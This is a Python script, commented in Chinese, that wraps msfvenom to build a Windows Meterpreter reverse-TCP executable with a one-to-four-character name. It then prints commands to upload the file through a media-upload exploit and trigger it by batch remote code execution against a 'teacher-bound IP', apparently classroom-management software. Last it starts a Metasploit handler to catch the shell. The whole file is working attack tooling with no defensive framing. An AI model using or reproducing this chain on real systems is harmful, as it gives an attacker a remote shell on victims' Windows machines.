#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""msfvenom 包装：生成 1-4 字符文件名的 EXE（WinExec 限制）。"""
import argparse
import os
import re
import shutil
import subprocess
import sys

DEFAULT_PAYLOAD = "windows/meterpreter/reverse_tcp"
# 有的机器 msfvenom 不在 PATH，手动找一下
COMMON = (
    r"F:\metasploit-framework\bin\msfvenom.bat",
    r"C:\metasploit-framework\bin\msfvenom.bat",
)


def find_msfvenom(explicit):
    if explicit:
        return explicit if os.path.exists(explicit) else None
    for name in ("msfvenom", "msfvenom.bat", "msfvenom.cmd"):
        p = shutil.which(name)
        if p:
            return p
    for p in COMMON:
        if os.path.exists(p):
            return p
    return None


def main():
    ap = argparse.ArgumentParser(description="生成 4 字符文件名的 Windows EXE")
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--name", default="rce", help="1-4 个 ASCII 字符，默认 rce")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    ap.add_argument("--out", help="输出文件，默认 <name>.exe")
    ap.add_argument("--msfvenom", help="msfvenom 路径")
    args = ap.parse_args()

    if not re.fullmatch(r"[A-Za-z0-9]{1,4}", args.name):
        ap.error("name 只能 1-4 个 ASCII 字母/数字")
    if not 1 <= args.lport <= 65535:
        ap.error("lport 不对")

    msfvenom = find_msfvenom(args.msfvenom)
    if not msfvenom:
        print("[!] 没找到 msfvenom，装 Metasploit 或者用 --msfvenom 指定",
              file=sys.stderr)
        return 2

    out = args.out or (args.name + ".exe")
    parent = os.path.dirname(os.path.abspath(out))
    if parent and not os.path.isdir(parent):
        os.makedirs(parent, exist_ok=True)

    cmd = [msfvenom, "-p", args.payload, "LHOST=" + args.lhost,
           "LPORT=" + str(args.lport), "-f", "exe", "-o", out]
    if msfvenom.lower().endswith((".bat", ".cmd")):
        cmd = ["cmd.exe", "/c"] + cmd
    print("[*] " + " ".join(cmd))
    r = subprocess.run(cmd)
    if r.returncode != 0 or not os.path.exists(out):
        print("[!] msfvenom 失败", file=sys.stderr)
        return 1

    size = os.path.getsize(out)
    print("[+] %s (%d bytes), 触发命令 %r" % (out, size, args.name))
    if size > 0xF000:
        print("[!] 超过 60KB，上传等待时间要加，或者换 staged",
              file=sys.stderr)

    print("\n下一步（IP/路径换成你自己的）：")
    print("  python exploit/media_upload.py %s \"<可写搜索路径>\\%s.exe\" "
          "--delay-ms 30" % (out, args.name))
    print("  python exploit/remote_batch_rce.py --target <教师绑定IP> "
          "--send-ip <中继IP> --port 4705 --count 150 --command4 %s "
          "--no-verify" % args.name)
    print("  msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD %s; "
          "set LHOST %s; set LPORT %d; run\""
          % (args.payload, args.lhost, args.lport))
    return 0


if __name__ == "__main__":
    sys.exit(main())
